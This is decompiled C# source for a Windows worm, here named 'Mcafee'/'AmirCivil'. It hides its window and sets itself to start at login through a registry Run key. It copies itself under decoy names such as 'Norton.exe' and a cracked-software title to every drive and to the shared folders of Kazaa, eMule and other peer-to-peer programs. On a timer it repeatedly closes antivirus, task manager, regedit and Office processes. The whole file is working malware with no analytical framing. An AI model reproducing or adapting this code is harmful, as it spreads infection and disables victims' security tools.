using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Api;
using Microsoft.Win32;

namespace Mcafee;

public class Form1 : Form
{
	private IContainer components;

	private Timer mailer;

	private Timer killer;

	private Timer coppy;

	private Timer eerrorr;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		components = new Container();
		mailer = new Timer(components);
		killer = new Timer(components);
		coppy = new Timer(components);
		eerrorr = new Timer(components);
		((Control)this).SuspendLayout();
		mailer.set_Enabled(true);
		mailer.set_Interval(50000);
		mailer.add_Tick((EventHandler)mailer_Tick);
		killer.set_Enabled(true);
		killer.set_Interval(150);
		killer.add_Tick((EventHandler)killer_Tick);
		coppy.set_Enabled(true);
		coppy.set_Interval(720000);
		coppy.add_Tick((EventHandler)coppy_Tick);
		eerrorr.set_Enabled(true);
		eerrorr.set_Interval(90000);
		eerrorr.add_Tick((EventHandler)eerrorr_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 266));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("AmirCivil");
		((Form)this).add_Activated((EventHandler)amir22);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void mailer_Tick(object sender, EventArgs e)
	{
		Form val = (Form)(object)new Form2();
		((Control)val).Show();
	}

	private void killer_Tick(object sender, EventArgs e)
	{
		try
		{
			string[] array = new string[57]
			{
				"NPROTECTED", "GhostTray", "NAVW32", "F-AGNT95", "NOD32", "NETD32", "NETMON", "IOMON98", "SCAN32", "NORMIST",
				"NAVW3", "ADAWARE", "AGENTW", "LU32", "NAVAP32", "ANTIVIR", "TCM", "W9X", "AVKSERV", "AV32",
				"ACKWIN32", "AD-AWARE", "ADVXDWIN", "AGENTSVR", "AGENTW", "ANTIVIRUS", "ANTS", "APIMONITOR", "APLICA32", "ARR",
				"AUPDATE", "AUTODOWN", "AUTOTRACE", "AVE32", "AVGCC32", "AVGCTRL", "AVGNT", "CFINET", "CLEANPC", "CTRL",
				"AV32", "DATEMANAGER ", "DOORS", "DPFSETUP ", "FCH32 ", "FNRB32", "notepad", "Babylon", "POP3TRAP", "WINWORD",
				"realplay", "EXCEL", "taskmgr", "regedit", "vb6", "ZONEALARM", "POWERPNT"
			};
			Random random = new Random();
			int num = random.Next(0, 57);
			string processName = array[num];
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array2 = processesByName;
			foreach (Process process in array2)
			{
				process.CloseMainWindow();
			}
		}
		catch (Exception)
		{
		}
	}

	private void coppy_Tick(object sender, EventArgs e)
	{
		try
		{
			string[] array = new string[10] { "\\Services.pif", "\\winamp.exe", "\\mail.dll.exe", "\\vista.exe", "\\Norton.exe", "\\Mcafee.exe", "\\Nod32.cmd", "\\avg.pif", "\\AmirCivil.pif", "\\ScreenSaver.scr" };
			Random random = new Random();
			int num = random.Next(0, 10);
			string text = array[num];
			string[] logicalDrives = Directory.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				File.Copy(Application.get_ExecutablePath(), logicalDrives[i] + text);
			}
		}
		catch (Exception)
		{
		}
	}

	private void amir22(object sender, EventArgs e)
	{
		((Control)this).Hide();
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\WinServicces.cab.bak.exe");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SadNet3", Environment.SystemDirectory + "\\WinServicces.cab.bak.exe", RegistryValueKind.ExpandString);
			Registry.SetValue("HKEY_CURRENT_USER\\SadNet3", "SadNet3", "(_-oO]xX|-|S|-|a|-|d|-|N|-|e|-|t|-|Xx[Oo-_)!", RegistryValueKind.ExpandString);
		}
		catch (Exception)
		{
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\\\Kazaa\\My Shared Folder\\project.exe");
			File.Copy(Application.get_ExecutablePath(), "J:\\Program Files\\\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\\\Kazaa\\My Shared Folder\\screen_saver!.scr");
			File.Copy(Application.get_ExecutablePath(), "F:\\Program Files\\\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
			File.Copy(Application.get_ExecutablePath(), "H:\\Program Files\\\\Kazaa\\My Shared Folder\\fun.pic.scr");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\winampa2.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\eMule\\Incoming\\symantec.cmd");
			File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
			File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\project.exe");
			File.Copy(Application.get_ExecutablePath(), "J:\\Program Files\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
			File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\screen_saver!.scr");
			File.Copy(Application.get_ExecutablePath(), "F:\\Program Files\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
			File.Copy(Application.get_ExecutablePath(), "H:\\Program Files\\Kazaa\\My Shared Folder\\fun.pic.scr");
		}
		catch (Exception)
		{
		}
	}

	private void eerrorr_Tick(object sender, EventArgs e)
	{
		api.MessageBeep(20);
		api.shell32_59(0, "Windows", 1);
	}
}
